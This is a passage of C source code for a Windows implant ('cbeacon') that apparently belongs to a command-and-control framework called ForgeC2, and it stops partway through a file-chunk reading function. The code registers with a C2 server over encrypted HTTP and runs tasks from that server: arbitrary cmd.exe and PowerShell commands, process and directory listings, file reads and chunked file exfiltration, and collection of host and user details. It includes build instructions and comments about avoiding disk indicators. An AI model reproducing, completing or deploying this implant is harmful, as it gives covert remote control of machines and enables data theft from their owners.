/* beacon.c — C implant (HTTP beacon, core tasks).
 *
 * Wire-compatible with the ForgeC2 v2 envelope:
 *   1. register frame  {uuid,seq,ts,ecdh_pub=id_pub,id_pub,secret_id,reg_hmac}
 *      reg_hmac  = b64(HMAC-SHA256(regKey, uuid||id_pub_b64||ts_be64||seq_be64))
 *   2. verify response MAC = b64(HMAC(regKey, uuid||seq||server_pub_b64))
 *   3. session key = HKDF-SHA256(X25519(id_priv, server_pub),
 *                      salt "forgec2-session-v2", info uuid)
 *   4. encrypted frames {uuid,seq,ts,c} with c = b64(nonce12||AES-GCM(inner)),
 *      AAD = uuid || 0x00 || seq_ascii. Inner body is PLAIN JSON (the server
 *      accepts unmarked JSON; no cbor/msgpack needed).
 *   5. tasks: shell/ps/ls/read/hostinfo/set_sleep/beacon_now/kill/
 *      download/upload (+ process_tree alias), with per-task enc
 *      decryption (AES-GCM, AAD uuid\\0taskID) and base64 results.
 *
 * Build (mingw-w64):
 *   x86_64-w64-mingw32-gcc -O2 -o cbeacon.exe beacon.c crypto_cng.c ^
 *     -lwinhttp -lbcrypt -D C2_HOST="..." -D C2_PORT=... ^
 *     -D SECRET_ID="..." -D SECRET_B64="..."
 *
 * This is a PROTOTYPE: HTTP only, no persistence, no evasion.
 * Identity (UUID + X25519 key) persists in %TEMP%\\fc2c.dat.
 */
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "crypto_cng.h"
#include "curve25519.h"

#pragma comment(lib, "winhttp.lib")

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8000
#endif
#ifndef BEACON_PATH
#define BEACON_PATH "/api/v1/beacon"
#endif
#ifndef SECRET_ID
#define SECRET_ID ""
#endif
#ifndef SECRET_B64
#define SECRET_B64 ""
#endif
#ifndef INTERVAL
#define INTERVAL 10
#endif

#define RESP_CAP (12u * 1024u * 1024u)
#define OUT_CAP (512u * 1024u)
#define INFO_CAP 4096

/* Runtime sleep interval (seconds), mutable via set_sleep task. */
static int g_interval = INTERVAL;
static int g_jitter = 0;

static BYTE g_regkey[32];
static BYTE g_sesskey[32];
static int g_have_session = 0;
static char g_uuid[40];
static unsigned long long g_seq = 0;
static void seq_save(void) {
    char p[260];
    DWORD n = GetTempPathA((DWORD)sizeof(p), p);
    FILE *f;
    if (n == 0 || n >= sizeof(p) - 16) return;
    strcat_s(p, sizeof(p), "fc2c.seq");
    f = fopen(p, "w");
    if (!f) return;
    fprintf(f, "%llu", g_seq);
    fclose(f);
}
static void seq_load(void) {
    char p[260];
    DWORD n = GetTempPathA((DWORD)sizeof(p), p);
    FILE *f;
    unsigned long long v = 0;
    if (n == 0 || n >= sizeof(p) - 16) return;
    strcat_s(p, sizeof(p), "fc2c.seq");
    f = fopen(p, "r");
    if (!f) return;
    if (fscanf(f, "%llu", &v) == 1 && v > g_seq) g_seq = v;
    fclose(f);
}
static unsigned long long next_seq(void) {
    ++g_seq;
    seq_save();
    return g_seq;
}
static int g_registered = 0;

/* ---------- tiny JSON helpers (responses only contain known shapes) ---------- */

static const char *jskip(const char *p) {
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
    return p;
}

/* Find top-level "key" and return pointer to its value (caller parses). */
static const char *jfind(const char *json, const char *key) {
    char pat[128];
    const char *p;
    _snprintf(pat, sizeof(pat), "\"%s\"", key);
    p = strstr(json, pat);
    if (!p) return NULL;
    p += strlen(pat);
    p = jskip(p);
    if (*p != ':') return NULL;
    return jskip(p + 1);
}

/* Extract a JSON string value into out (unescapes \" and \\). Returns 1 on ok. */
static int jstring(const char *json, const char *key, char *out, size_t outcap) {
    const char *p = jfind(json, key);
    size_t o = 0;
    if (!p || *p != '"') return 0;
    p++;
    while (*p && *p != '"' && o + 1 < outcap) {
        if (*p == '\\' && p[1]) {
            p++;
            if (*p == 'n') out[o++] = '\n';
            else if (*p == 't') out[o++] = '\t';
            else out[o++] = *p;
            p++;
        } else {
            out[o++] = *p++;
        }
    }
    out[o] = '\0';
    return *p == '"';
}

static int jbool(const char *json, const char *key) {
    const char *p = jfind(json, key);
    return p && strncmp(p, "true", 4) == 0;
}

static unsigned long long ju64(const char *json, const char *key) {
    const char *p = jfind(json, key);
    if (!p) return 0;
    return _strtoui64(p, NULL, 10);
}

/* Escape a string for JSON output. Returns malloc'd buffer. */
static char *jescape(const char *s, size_t maxlen) {
    size_t i, o = 0, cap = maxlen * 2 + 1;
    char *out = (char *)malloc(cap);
    if (!out) return NULL;
    for (i = 0; s[i] && i < maxlen && o + 6 < cap; i++) {
        unsigned char c = (unsigned char)s[i];
        if (c == '"') { out[o++] = '\\'; out[o++] = '"'; }
        else if (c == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
        else if (c == '\n') { out[o++] = '\\'; out[o++] = 'n'; }
        else if (c == '\r') { out[o++] = '\\'; out[o++] = 'r'; }
        else if (c == '\t') { out[o++] = '\\'; out[o++] = 't'; }
        else if (c < 0x20) { o += _snprintf(out + o, cap - o, "\\u%04x", c); }
        else out[o++] = (char)c;
    }
    out[o] = '\0';
    return out;
}

/* ---------- HTTP ---------- */

/* E2E debug sink: compiled out unless -DE2E_DEBUG (avoids disk IOC). */
static void dbglog(const char *tag, const char *data, int datalen) {
#ifdef E2E_DEBUG
    FILE *f = fopen("C:\\Windows\\Temp\\cbeacon-dbg.log", "ab");
    if (!f) return;
    fprintf(f, "[%s len=%d] ", tag, datalen);
    if (data && datalen > 0) {
        int n = datalen > 600 ? 600 : datalen;
        fwrite(data, 1, (size_t)n, f);
    }
    fprintf(f, "\n");
    fclose(f);
#else
    (void)tag; (void)data; (void)datalen;
#endif
}

static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    char *resp = NULL;
    DWORD cap = 65536, len = 0, avail = 0, got = 0;
    wchar_t whost[256], wpath[256];
    MultiByteToWideChar(CP_UTF8, 0, C2_HOST, -1, whost, 256);
    MultiByteToWideChar(CP_UTF8, 0, BEACON_PATH, -1, wpath, 256);
    resp = (char *)malloc(cap);
    if (!resp) return NULL;
    hSess = WinHttpOpen(L"FC2-C/0.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto done;
    hConn = WinHttpConnect(hSess, whost, (INTERNET_PORT)C2_PORT, 0);
    if (!hConn) goto done;
    hReq = WinHttpOpenRequest(hConn, L"POST", wpath, NULL, WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hReq) goto done;
    {
        wchar_t hdrs[] = L"Content-Type: application/json\r\n";
        DWORD hlen = (DWORD)-1L;
        if (!WinHttpSendRequest(hReq, hdrs, hlen, (LPVOID)body, bodylen,
                                bodylen, 0)) goto done;
        if (!WinHttpReceiveResponse(hReq, NULL)) goto done;
        for (;;) {
            if (!WinHttpQueryDataAvailable(hReq, &avail)) goto done;
            if (avail == 0) break;
            while (len + avail + 1 > cap) {
                cap *= 2;
                if (cap > RESP_CAP) goto done;
                resp = (char *)realloc(resp, cap);
                if (!resp) goto done2;
            }
            if (!WinHttpReadData(hReq, resp + len, avail, &got)) goto done;
            if (got == 0) break;
            len += got;
        }
        resp[len] = '\0';
        if (outlen) *outlen = len;
        if (hReq) WinHttpCloseHandle(hReq);
        if (hConn) WinHttpCloseHandle(hConn);
        if (hSess) WinHttpCloseHandle(hSess);
        return resp;
    }
done:
    free(resp);
    resp = NULL;
done2:
    if (hReq) WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return resp;
}

/* ---------- crypto glue ---------- */

static void put_be64(BYTE out[8], unsigned long long v) {
    int i;
    for (i = 0; i < 8; i++) out[7 - i] = (BYTE)(v >> (8 * i));
}

/* reg_hmac = b64(HMAC(regKey, uuid||idpub_b64||ts_be64||seq_be64)) */
static char *make_reg_hmac(const char *idpub_b64, long long ts,
                           unsigned long long seq) {
    BYTE tsb[8], seqb[8], mac[32];
    BYTE *msg;
    DWORD msglen;
    char *out;
    put_be64(tsb, (unsigned long long)ts);
    put_be64(seqb, seq);
    msglen = (DWORD)(strlen(g_uuid) + strlen(idpub_b64) + 16);
    msg = (BYTE *)malloc(msglen);
    if (!msg) return NULL;
    memcpy(msg, g_uuid, strlen(g_uuid));
    memcpy(msg + strlen(g_uuid), idpub_b64, strlen(idpub_b64));
    memcpy(msg + strlen(g_uuid) + strlen(idpub_b64), tsb, 8);
    memcpy(msg + strlen(g_uuid) + strlen(idpub_b64) + 8, seqb, 8);
    if (cng_hmac_sha256(g_regkey, 32, msg, msglen, mac) != 0) {
        cng_wipe(msg, msglen);
        free(msg);
        return NULL;
    }
    cng_wipe(msg, msglen);
    free(msg);
    out = b64enc(mac, 32);
    cng_wipe(mac, 32);
    return out;
}

/* frame mac = b64(HMAC(regKey, parts...)) for response verification. */
static int verify_resp_mac(unsigned long long seq, const char *server_pub_b64,
                           const char *mac_b64) {
    char seqs[32];
    BYTE mac[32], *got = NULL;
    DWORD gotlen = 0;
    int ok = 0;
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    {
        size_t a = strlen(g_uuid), b = strlen(seqs), c = strlen(server_pub_b64);
        char *msg = (char *)malloc(a + b + c + 1);
        BYTE digest[32];
        char *expect;
        if (!msg) return 0;
        memcpy(msg, g_uuid, a);
        memcpy(msg + a, seqs, b);
        memcpy(msg + a + b, server_pub_b64, c);
        msg[a + b + c] = '\0';
        if (cng_hmac_sha256(g_regkey, 32, (BYTE *)msg, (DWORD)(a + b + c), digest) != 0) {
            free(msg);
            return 0;
        }
        free(msg);
        expect = b64enc(digest, 32);
        cng_wipe(digest, 32);
        got = b64dec(mac_b64, &gotlen);
        if (expect && got && gotlen == 32 &&
            memcmp(expect, mac_b64, strlen(mac_b64)) == 0 &&
            strlen(expect) == strlen(mac_b64)) {
            /* constant-time compare on decoded bytes */
            unsigned diff = 0;
            BYTE *expb;
            DWORD explen = 0;
            expb = b64dec(expect, &explen);
            if (expb && explen == 32) {
                DWORD i;
                for (i = 0; i < 32; i++) diff |= (unsigned)(expb[i] ^ got[i]);
                ok = diff == 0;
                cng_wipe(expb, explen);
                free(expb);
            }
        }
        (void)mac;
        free(expect);
        if (got) { cng_wipe(got, gotlen); free(got); }
    }
    return ok;
}

/* ---------- tasks ---------- */

static char *exec_shell(const char *cmd, DWORD *outlen) {
    /* _popen runs through cmd.exe /c by default on Windows. */
    FILE *fp;
    char *buf;
    size_t cap = 65536, len = 0, n;
    char chunk[8192];
    buf = (char *)malloc(cap);
    if (!buf) return NULL;
    fp = _popen(cmd, "r");
    if (!fp) {
        strcpy_s(buf, cap, "[cbeacon] exec failed");
        if (outlen) *outlen = (DWORD)strlen(buf);
        return buf;
    }
    while ((n = fread(chunk, 1, sizeof(chunk), fp)) > 0) {
        if (len + n + 1 > cap) {
            if (cap >= OUT_CAP) break;
            cap *= 2;
            if (cap > OUT_CAP + 65536) cap = OUT_CAP + 65536;
            buf = (char *)realloc(buf, cap);
            if (!buf) { _pclose(fp); return NULL; }
        }
        if (len >= OUT_CAP) break;
        if (len + n > OUT_CAP) n = OUT_CAP - len;
        memcpy(buf + len, chunk, n);
        len += n;
    }
    _pclose(fp);
    buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return buf;
}

typedef struct {
    unsigned long long id;
    char type[48];
    char *command;
    char *shell;
    char *path;
    char *data;
    int enc;
    long long offset;
    long long size;
    char *prev_mac;
    char *mac;
} ctask_t;

/* Decrypt one base64(nonce12||ct||tag16) field with the session key.
 * AAD = uuid || 0x00 || taskID_ascii (mirrors Go decryptAESGCMWithAAD).
 * Returns malloc'd NUL-terminated plaintext, or NULL on failure. */
static char *decrypt_task_field(const char *b64, unsigned long long taskid) {
    char tids[32];
    BYTE *blob = NULL;
    DWORD bloblen = 0;
    BYTE *pt = NULL;
    char *aad = NULL;
    DWORD aadlen = 0;
    int ptlen = -1;
    char *out = NULL;
    if (!b64 || !b64[0]) return _strdup("");
    _snprintf(tids, sizeof(tids), "%llu", taskid);
    aadlen = (DWORD)(strlen(g_uuid) + 1 + strlen(tids));
    aad = (char *)malloc(aadlen);
    if (!aad) return NULL;
    memcpy(aad, g_uuid, strlen(g_uuid));
    aad[strlen(g_uuid)] = '\0';
    memcpy(aad + strlen(g_uuid) + 1, tids, strlen(tids));
    blob = b64dec(b64, &bloblen);
    if (!blob) { free(aad); return NULL; }
    pt = (BYTE *)malloc(bloblen + 1);
    if (!pt) { free(aad); free(blob); return NULL; }
    ptlen = cng_aesgcm_decrypt(g_sesskey, blob, bloblen,
                               (const BYTE *)aad, aadlen, pt, bloblen);
    cng_wipe(aad, aadlen);
    free(aad);
    free(blob);
    if (ptlen < 0) { cng_wipe(pt, bloblen); free(pt); return NULL; }
    out = (char *)malloc((size_t)ptlen + 1);
    if (!out) { cng_wipe(pt, (DWORD)ptlen); free(pt); return NULL; }
    memcpy(out, pt, (size_t)ptlen);
    out[ptlen] = '\0';
    cng_wipe(pt, (DWORD)ptlen);
    free(pt);
    return out;
}

/* Decrypt enc-wrapped task fields in place. Returns 0 ok, -1 on failure
 * (caller must report "task payload decryption failed"). */
static int decrypt_task(ctask_t *t) {
    char *d;
    if (!t->enc) return 0;
    if (t->command && t->command[0]) {
        d = decrypt_task_field(t->command, t->id);
        if (!d) return -1;
        free(t->command);
        t->command = d;
    }
    if (t->data && t->data[0]) {
        d = decrypt_task_field(t->data, t->id);
        if (!d) return -1;
        free(t->data);
        t->data = d;
    }
    if (t->shell && t->shell[0]) {
        d = decrypt_task_field(t->shell, t->id);
        if (d) { free(t->shell); t->shell = d; }
        /* shell decrypt failure is non-fatal except token_make parity:
         * keep cleartext interpreter (cmd.exe/powershell) like Go does. */
    }
    return 0;
}

static void free_task(ctask_t *t) {
    if (t->command) free(t->command);
    if (t->shell) free(t->shell);
    if (t->path) free(t->path);
    if (t->data) free(t->data);
    if (t->prev_mac) free(t->prev_mac);
    if (t->mac) free(t->mac);
    memset(t, 0, sizeof(*t));
}

/* File-transfer integrity chain (mirrors Go fileChainKey/chainPrev/commit):
 * chainKey = HKDF(regKey, salt "forgec2-filechain-v1", info "file-transfer");
 * link = HMAC(chainKey, prev || data), hex-encoded on the wire. */
#define CHAIN_SLOTS 32
static void hex_encode(const BYTE *in, size_t len, char *out);
static BYTE g_chainkey[32];
static int g_chainkey_ok = 0;
static struct { unsigned long long id; BYTE prev[32]; int used; } g_chains[CHAIN_SLOTS];

static int chain_key(void) {
    if (g_chainkey_ok) return 0;
    if (cng_hkdf_sha256(g_regkey, 32,
                         (const BYTE *)"forgec2-filechain-v1", 22,
                         (const BYTE *)"file-transfer", 13,
                         g_chainkey) != 0) return -1;
    g_chainkey_ok = 1;
    return 0;
}

static BYTE *chain_prev(unsigned long long id) {
    int i;
    for (i = 0; i < CHAIN_SLOTS; i++)
        if (g_chains[i].used && g_chains[i].id == id) return g_chains[i].prev;
    return NULL;
}

static void chain_commit(unsigned long long id, const BYTE mac[32]) {
    int i, slot = -1;
    for (i = 0; i < CHAIN_SLOTS; i++) {
        if (g_chains[i].used && g_chains[i].id == id) { slot = i; break; }
        if (!g_chains[i].used && slot < 0) slot = i;
    }
    if (slot < 0) slot = (int)(id % CHAIN_SLOTS);
    g_chains[slot].id = id;
    memcpy(g_chains[slot].prev, mac, 32);
    g_chains[slot].used = 1;
}

static int hex_to32(const char *hex, BYTE out[32]) {
    size_t k;
    if (!hex || strlen(hex) != 64) return -1;
    for (k = 0; k < 32; k++) {
        char hb[3] = { hex[2*k], hex[2*k+1], 0 };
        char *end = NULL;
        unsigned long v = strtoul(hb, &end, 16);
        if (!end || *end) return -1;
        out[k] = (BYTE)v;
    }
    return 0;
}

/* Adopt a server-supplied chain prev (upload push path, mirrors Go). */
static int chain_adopt(unsigned long long id, const char *prev_hex) {
    BYTE prev[32];
    int i, slot = -1;
    if (hex_to32(prev_hex, prev) != 0) return -1;
    for (i = 0; i < CHAIN_SLOTS; i++) {
        if (g_chains[i].used && g_chains[i].id == id) { slot = i; break; }
        if (!g_chains[i].used && slot < 0) slot = i;
    }
    if (slot < 0) slot = (int)(id % CHAIN_SLOTS);
    g_chains[slot].id = id;
    memcpy(g_chains[slot].prev, prev, 32);
    g_chains[slot].used = 1;
    cng_wipe(prev, 32);
    return 0;
}

static int chain_hmac(const BYTE prev[32], const BYTE *data, DWORD datalen,
                      BYTE out[32]) {
    DWORD mlen = datalen + 32;
    BYTE *msg = (BYTE *)malloc(mlen);
    int rc = -1;
    if (!msg) return -1;
    memcpy(msg, prev, 32);
    if (datalen) memcpy(msg + 32, data, datalen);
    rc = cng_hmac_sha256(g_chainkey, 32, msg, mlen, out);
    cng_wipe(msg, mlen);
    free(msg);
    return rc;
}

/* Download path: link = HMAC(key, stored_prev || data), commit, hex out. */
static int chain_download_link(unsigned long long id, const BYTE *data,
                               DWORD datalen, char hexout[65]) {
    BYTE prev[32], mac[32];
    BYTE *p;
    if (chain_key() != 0) return -1;
    memset(prev, 0, 32);
    p = chain_prev(id);
    if (p) memcpy(prev, p, 32);
    if (chain_hmac(prev, data, datalen, mac) != 0) return -1;
    chain_commit(id, mac);
    hex_encode(mac, 32, hexout);
    cng_wipe(mac, 32);
    return 0;
}

/* Upload path: adopt prev when supplied, verify expected MAC when supplied
 * (constant-time compare), commit on match. Mirrors Go verifyFileChunk. */
static int chain_verify_upload(unsigned long long id, const BYTE *data,
                               DWORD datalen, const char *prev_hex,
                               const char *expected_hex) {
    BYTE prev[32], mac[32], want[32];
    BYTE *p;
    DWORD i;
    unsigned diff;
    if (chain_key() != 0) return -1;
    if (prev_hex && prev_hex[0] && chain_adopt(id, prev_hex) != 0) return -1;
    if (!expected_hex || !expected_hex[0]) return 0;
    if (hex_to32(expected_hex, want) != 0) return -1;
    memset(prev, 0, 32);
    p = chain_prev(id);
    if (p) memcpy(prev, p, 32);
    if (chain_hmac(prev, data, datalen, mac) != 0) {
        cng_wipe(want, 32); return -1;
    }
    diff = 0;
    for (i = 0; i < 32; i++) diff |= (unsigned)(mac[i] ^ want[i]);
    cng_wipe(want, 32);
    if (diff != 0) { cng_wipe(mac, 32); return -1; }
    chain_commit(id, mac);
    cng_wipe(mac, 32);
    return 0;
}

/* Reject ".." path components (mirrors Go sanitizeWritePath). */
static int path_is_safe(const char *p) {
    const char *s = p;
    char comp[16];
    size_t cl = 0;
    if (!p || !p[0]) return 0;
    for (;;) {
        char c = *s;
        if (c == '/' || c == '\\' || c == '\0') {
            if (cl == 2 && comp[0] == '.' && comp[1] == '.') return 0;
            cl = 0;
            if (c == '\0') break;
        } else if (cl < sizeof(comp)) {
            comp[cl++] = c;
        }
        s++;
    }
    return 1;
}

static void hex_encode(const BYTE *in, size_t len, char *out) {
    static const char *h = "0123456789abcdef";
    size_t i;
    for (i = 0; i < len; i++) { out[2*i] = h[in[i] >> 4]; out[2*i+1] = h[in[i] & 15]; }
    out[2*len] = '\0';
}

/* Parse one task object (we are positioned at its '{'). Fills t (strings
 * malloc'd). Returns pointer past the object, or NULL. */
static const char *parse_task(const char *p, ctask_t *t) {
    char typ[48] = {0};
    char *cmd = NULL, *sh = NULL, *pa = NULL, *da = NULL;
    int depth = 0;
    const char *start = p, *q;
    memset(t, 0, sizeof(*t));
    /* find matching brace */
    q = p;
    do {
        if (*q == '"') {
            q++;
            while (*q && *q != '"') { if (*q == '\\' && q[1]) q++; q++; }
        } else if (*q == '{') {
            depth++;
        } else if (*q == '}') {
            depth--;
        }
        q++;
    } while (*q && depth > 0);
    {
        size_t objlen = (size_t)(q - start);
        char *obj = (char *)malloc(objlen + 1);
        if (!obj) return NULL;
        memcpy(obj, start, objlen);
        obj[objlen] = '\0';
        if (jstring(obj, "type", typ, sizeof(typ)))
            strcpy_s(t->type, sizeof(t->type), typ);
        {
            const char *pi = jfind(obj, "id");
            if (pi) t->id = _strtoui64(pi, NULL, 10);
        }
        t->enc = jbool(obj, "enc");
        cmd = (char *)malloc(objlen + 1);
        sh = (char *)malloc(objlen + 1);
        pa = (char *)malloc(objlen + 1);
        da = (char *)malloc(objlen + 1);
        if (cmd && jstring(obj, "command", cmd, objlen + 1)) t->command = _strdup(cmd);
        if (sh && jstring(obj, "shell", sh, objlen + 1)) t->shell = _strdup(sh);
        if (pa && jstring(obj, "path", pa, objlen + 1)) t->path = _strdup(pa);
        if (da && jstring(obj, "data", da, objlen + 1)) t->data = _strdup(da);
        t->offset = (long long)ju64(obj, "offset");
        t->size = (long long)ju64(obj, "size");
        {
            char pm[128] = {0}, em[128] = {0};
            if (jstring(obj, "prev_mac", pm, sizeof(pm))) t->prev_mac = _strdup(pm);
            if (jstring(obj, "mac", em, sizeof(em))) t->mac = _strdup(em);
        }
        if (cmd) free(cmd);
        if (sh) free(sh);
        if (pa) free(pa);
        if (da) free(da);
        free(obj);
    }
    return q;
}

/* ---------- host info + task handlers (wire-compatible with Go agent) ---------- */

static char *b64_of_str(const char *s) {
    char *o;
    if (!s) s = "";
    o = b64enc((const BYTE *)s, (DWORD)strlen(s));
    return o ? o : _strdup("");
}

/* Build the inner \"info\" object JSON (malloc'd). Mirrors Go getSystemInfo:
 * hostname/username/ip are base64 with encoding=base64 marker. */
static char *build_info_json(void) {
    char host[256] = {0}, user[256] = {0};
    DWORD hlen = sizeof(host), ulen = sizeof(user);
    char *hb64 = NULL, *ub64 = NULL;
    char *out = NULL;
    char pname[MAX_PATH] = {0};
    DWORD pid = GetCurrentProcessId();
    GetComputerNameA(host, &hlen);
    GetUserNameA(user, &ulen);
    if (!host[0]) strcpy_s(host, sizeof(host), "unknown");
    if (!user[0]) strcpy_s(user, sizeof(user), "unknown");
    GetModuleFileNameA(NULL, pname, sizeof(pname));
    {
        char *base = strrchr(pname, '\\');
        if (base) memmove(pname, base + 1, strlen(base));
    }
    hb64 = b64_of_str(host);
    ub64 = b64_of_str(user);
    out = (char *)malloc(INFO_CAP);
    if (out) {
        _snprintf(out, INFO_CAP,
            "\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows\","
            "\"arch\":\"amd64\",\"implant\":\"c\",\"encoding\":\"base64\","
            "\"pid\":\"%lu\",\"process_name\":\"%s\","
            "\"interval\":\"%d\",\"jitter\":\"%d\",\"version\":\"c-0.2\"",
            hb64, ub64, (unsigned long)pid, pname[0] ? pname : "cbeacon.exe",
            g_interval, g_jitter);
    }
    free(hb64);
    free(ub64);
    return out;
}

static char *make_rid(void) {
    BYTE rb[16];
    char *rid = (char *)malloc(40);
    if (!rid) return NULL;
    if (cng_random(rb, 16) != 0) { free(rid); return NULL; }
    _snprintf(rid, 40, "%02x%02x%02x%02x-%02x%02x-4%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        rb[0], rb[1], rb[2], rb[3], rb[4], rb[5], rb[6] & 0x0F,
        rb[8] & 0x3F, rb[9], rb[10], rb[11], rb[12], rb[13], rb[14], rb[15]);
    return rid;
}

/* Emit one result object (malloc'd). b64out must already be base64 text. */
static char *emit_b64_result(unsigned long long id, const char *type,
                             const char *b64out, const char *rid) {
    size_t need = strlen(b64out) + strlen(type) + 128;
    char *o = (char *)malloc(need);
    if (!o) return NULL;
    _snprintf(o, need,
        "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
        "\"encoding\":\"base64\",\"rid\":\"%s\"}",
        id, type, b64out, rid ? rid : "");
    return o;
}

static char *emit_text_result(unsigned long long id, const char *type,
                              const char *text, const char *rid) {
    char *esc = jescape(text ? text : "", strlen(text ? text : ""));
    char *o;
    size_t need;
    if (!esc) return NULL;
    need = strlen(esc) + strlen(type) + 128;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\",\"rid\":\"%s\"}",
            id, type, esc, rid ? rid : "");
    }
    free(esc);
    return o;
}

static char *emit_error_result(unsigned long long id, const char *type,
                               const char *err, const char *rid) {
    char *esc = jescape(err ? err : "failed", strlen(err ? err : "failed"));
    char *o;
    size_t need;
    if (!esc) return NULL;
    need = strlen(esc) + strlen(type) + 128;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":%llu,\"type\":\"%s\",\"error\":\"%s\",\"rid\":\"%s\"}",
            id, type, esc, rid ? rid : "");
    }
    free(esc);
    return o;
}

/* Shell with interpreter awareness: powershell shell runs via powershell.exe. */
static char *exec_shell_full(const char *cmd, const char *shell, DWORD *outlen) {
    char *full = NULL;
    char *out = NULL;
    if (shell && (strstr(shell, "powershell") || strstr(shell, "PowerShell"))) {
        size_t nl = strlen(cmd) + 64;
        full = (char *)malloc(nl);
        if (!full) return NULL;
        _snprintf(full, nl, "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd);
        out = exec_shell(full, outlen);
        free(full);
        return out;
    }
    return exec_shell(cmd ? cmd : "", outlen);
}

static char *do_ps(DWORD *outlen) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    char *buf;
    size_t cap = 65536, len = 0;
    buf = (char *)malloc(cap);
    if (!buf) return NULL;
    len = (size_t)_snprintf(buf, cap, "PID\tPPID\tTHREADS\tMEM_KB\tNAME\n");
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        if (outlen) *outlen = (DWORD)len;
        return buf;
    }
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            char line[640];
            char mems[32];
            int n;
            HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (hp) {
                PROCESS_MEMORY_COUNTERS pmc;
                memset(&pmc, 0, sizeof(pmc));
                pmc.cb = sizeof(pmc);
                if (GetProcessMemoryInfo(hp, &pmc, sizeof(pmc)))
                    _snprintf(mems, sizeof(mems), "%llu", pmc.WorkingSetSize / 1024);
                else
                    strcpy_s(mems, sizeof(mems), "-");
                CloseHandle(hp);
            } else {
                strcpy_s(mems, sizeof(mems), "-");
            }
            n = _snprintf(line, sizeof(line), "%lu\t%lu\t%ld\t%s\t%s\n",
                (unsigned long)pe.th32ProcessID,
                (unsigned long)pe.th32ParentProcessID, (long)pe.cntThreads,
                mems, pe.szExeFile);
            if (len + (size_t)n + 1 > cap) {
                if (cap >= OUT_CAP) break;
                cap *= 2;
                if (cap > OUT_CAP + 65536) cap = OUT_CAP + 65536;
                buf = (char *)realloc(buf, cap);
                if (!buf) { CloseHandle(snap); return NULL; }
            }
            memcpy(buf + len, line, (size_t)n);
            len += (size_t)n;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return buf;
}

static char *do_ls(const char *path, DWORD *outlen) {
    char pat[MAX_PATH * 2];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char *buf;
    size_t cap = 32768, len = 0;
    const char *dir = (path && path[0]) ? path : "C:\\";
    buf = (char *)malloc(cap);
    if (!buf) return NULL;
    len = (size_t)_snprintf(buf, cap, "Type\tName\tSize\n");
    _snprintf(pat, sizeof(pat), "%s%s*", dir,
        (dir[strlen(dir)-1] == '\\' || dir[strlen(dir)-1] == '/') ? "" : "\\");
    h = FindFirstFileA(pat, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        size_t m = strlen(dir) + 32;
        if (len + m + 1 > cap) { cap = len + m + 1; buf = (char *)realloc(buf, cap); }
        if (buf) len += (size_t)_snprintf(buf + len, cap - len, "ERROR: cannot list %s (%lu)\n", dir, GetLastError());
        if (outlen) *outlen = (DWORD)len;
        return buf;
    }
    do {
        char line[1024];
        int n;
        unsigned long long sz = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        const char *typ = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
        n = _snprintf(line, sizeof(line), "%s\t%s\t%llu\n", typ, fd.cFileName, sz);
        if (len + (size_t)n + 1 > cap) {
            if (cap >= OUT_CAP) break;
            cap *= 2;
            buf = (char *)realloc(buf, cap);
            if (!buf) { FindClose(h); return NULL; }
        }
        memcpy(buf + len, line, (size_t)n);
        len += (size_t)n;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return buf;
}

static BYTE *do_read_file(const char *path, DWORD *outlen) {
    HANDLE h;
    DWORD sz, rd = 0;
    BYTE *buf;
    if (!path || !path[0]) return NULL;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz > OUT_CAP) sz = OUT_CAP;
    buf = (BYTE *)malloc(sz + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    ReadFile(h, buf, sz, &rd, NULL);
    CloseHandle(h);
    *outlen = rd;
    return buf;
}

/* Offset-based chunk read (mirrors Go downloadFileChunk): default 1MB,
 * capped at 4MB. *roff echoes the effective offset. */
static BYTE *do_read_chunk(const char *path, long long offset, long long size,
                           DWORD *outlen, long long *roff) {
    HANDLE h;
    DWORD want, rd = 0;
    BYTE *buf;
    LARGE_INTEGER li;
    if (!path || !path[0]) return NULL;
    if (offset < 0) offset = 0;
    if (size <= 0) size = 1024 * 1024;
